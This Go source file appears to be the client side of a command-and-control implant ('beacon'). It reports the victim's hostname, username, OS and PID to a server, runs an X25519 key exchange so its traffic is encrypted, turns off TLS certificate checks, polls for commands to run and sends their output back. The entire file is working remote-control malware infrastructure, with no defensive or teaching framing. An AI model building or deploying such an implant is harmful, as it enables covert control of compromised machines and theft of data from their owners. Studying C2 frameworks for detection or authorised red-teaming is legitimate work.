package main

import (
	"bytes"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"
)

// BeaconInfo holds identifying info sent during registration
type BeaconInfo struct {
	ID            string  `json:"id"`
	Hostname      string  `json:"hostname"`
	Username      string  `json:"username"`
	OS            string  `json:"os"`
	Arch          string  `json:"arch"`
	PID           int     `json:"pid"`
	SleepInterval int     `json:"sleep_interval"`
	Jitter        float64 `json:"jitter"`
}

// Task represents a command to execute
type Task struct {
	ID      string   `json:"id"`
	Command string   `json:"command"`
	Args    []string `json:"args"`
	Timeout int      `json:"timeout"`
}

// PollResponse is the decrypted response from /poll
type PollResponse struct {
	Tasks []Task `json:"tasks"`
}

// RegisterResponse is the decrypted response from /register
type RegisterResponse struct {
	Success       bool    `json:"success"`
	BeaconID      string  `json:"beacon_id"`
	SleepInterval int     `json:"sleep_interval"`
	Jitter        float64 `json:"jitter"`
	ServerID      string  `json:"server_id"`
}

// HandshakeResponse is the response from /handshake
type HandshakeResponse struct {
	PublicKey string `json:"public_key"`
}

// HTTPClient wraps the server communication with encryption
type HTTPClient struct {
	baseURL    string
	httpClient *http.Client
	beaconID   string
}

// NewHTTPClient creates a new beacon HTTP client
func NewHTTPClient(baseURL string) *HTTPClient {
	tr := &http.Transport{
		TLSClientConfig: InsecureTLSConfig(),
	}
	return &HTTPClient{
		baseURL: baseURL,
		httpClient: &http.Client{
			Transport: tr,
			Timeout:   30 * time.Second,
		},
	}
}

// ── X25519 Handshake ────────────────────────────────────────────────

// Handshake performs X25519 key exchange with the server.
// On success, sets the global sessionKey and keyID for subsequent encryption.
func (c *HTTPClient) Handshake() error {
	// Generate ephemeral X25519 keypair
	privKey, pubHex, err := GenerateX25519Keypair()
	if err != nil {
		return fmt.Errorf("generate keypair: %w", err)
	}

	// Send public key to server
	body := map[string]string{"public_key": pubHex}
	jsonBody, _ := json.Marshal(body)

	url := c.baseURL + "/api/v1/handshake"
	req, err := http.NewRequest(http.MethodPost, url, bytes.NewReader(jsonBody))
	if err != nil {
		return fmt.Errorf("create handshake request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("handshake request: %w", err)
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("read handshake response: %w", err)
	}

	if resp.StatusCode != 200 {
		return fmt.Errorf("handshake returned %d: %s", resp.StatusCode, string(respBody))
	}

	var hsResp HandshakeResponse
	if err := json.Unmarshal(respBody, &hsResp); err != nil {
		return fmt.Errorf("parse handshake response: %w", err)
	}

	// Compute shared secret and derive session key
	derivedKey, err := ComputeSessionKey(privKey, hsResp.PublicKey)
	if err != nil {
		return fmt.Errorf("compute session key: %w", err)
	}

	// Set global session key and key ID
	sessionKey = derivedKey
	keyID = pubHex

	return nil
}

// ── Registration ─────────────────────────────────────────────────────

// Register sends the registration request and returns the server response
func (c *HTTPClient) Register(info *BeaconInfo) (*RegisterResponse, error) {
	payload, err := encryptPayload(info)
	if err != nil {
		return nil, fmt.Errorf("encrypt register: %w", err)
	}

	body := map[string]string{"payload": payload}
	resp, err := c.post("/api/v1/register", body)
	if err != nil {
		return nil, fmt.Errorf("register request: %w", err)
	}

	var result RegisterResponse
	if err := decryptPayload(resp.Payload, &result); err != nil {
		return nil, fmt.Errorf("decrypt register response: %w", err)
	}

	c.beaconID = result.BeaconID
	return &result, nil
}

// ── Task Polling ─────────────────────────────────────────────────────

// Poll fetches pending tasks from the server
func (c *HTTPClient) Poll() ([]Task, error) {
	payload, err := encryptPayload(map[string]any{
		"beacon_id": c.beaconID,
	})
	if err != nil {
		return nil, fmt.Errorf("encrypt poll: %w", err)
	}

	body := map[string]string{"payload": payload}
	resp, err := c.post("/api/v1/poll", body)
	if err != nil {
		return nil, fmt.Errorf("poll request: %w", err)
	}

	var result PollResponse
	if err := decryptPayload(resp.Payload, &result); err != nil {
		return nil, fmt.Errorf("decrypt poll response: %w", err)
	}

	return result.Tasks, nil
}

// ── Result Submission ────────────────────────────────────────────────

// SubmitResult sends the result of a task execution
func (c *HTTPClient) SubmitResult(taskID string, output string, errStr string, status string) error {
	payload := map[string]any{
		"beacon_id": c.beaconID,
		"task_id":   taskID,
		"output":    output,
		"status":    status,
	}
	// Don't send empty error string — server treats None as success
	if errStr != "" {
		payload["error"] = errStr
	}
	payloadEnc, err := encryptPayload(payload)
	if err != nil {
		return fmt.Errorf("encrypt result: %w", err)
	}

	body := map[string]string{"payload": payloadEnc}
	_, err = c.post("/api/v1/result", body)
	return err
}

// ── HTTP Helpers ─────────────────────────────────────────────────────

type apiResponse struct {
	Payload string `json:"payload"`
}

func (c *HTTPClient) post(path string, body any) (*apiResponse, error) {
	jsonBody, err := json.Marshal(body)
	if err != nil {
		return nil, fmt.Errorf("marshal body: %w", err)
	}

	url := c.baseURL + path
	req, err := http.NewRequest(http.MethodPost, url, bytes.NewReader(jsonBody))
	if err != nil {
		return nil, fmt.Errorf("create request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")

	// Add session key ID header if we have one
	if keyID != "" {
		req.Header.Set("X-Key-ID", keyID)
	}

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("http do: %w", err)
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read response: %w", err)
	}

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("server returned %d: %s", resp.StatusCode, string(respBody))
	}

	var apiResp apiResponse
	if err := json.Unmarshal(respBody, &apiResp); err != nil {
		return nil, fmt.Errorf("parse response: %w", err)
	}

	return &apiResp, nil
}

// ── UUID Generation ──────────────────────────────────────────────────

// GenerateUUID generates a random v4 UUID
func GenerateUUID() string {
	u := make([]byte, 16)
	rand.Read(u)
	u[6] = (u[6] & 0x0f) | 0x40 // Version 4
	u[8] = (u[8] & 0x3f) | 0x80 // Variant 10
	return fmt.Sprintf("%x-%x-%x-%x-%x", u[0:4], u[4:6], u[6:8], u[8:10], u[10:])
}
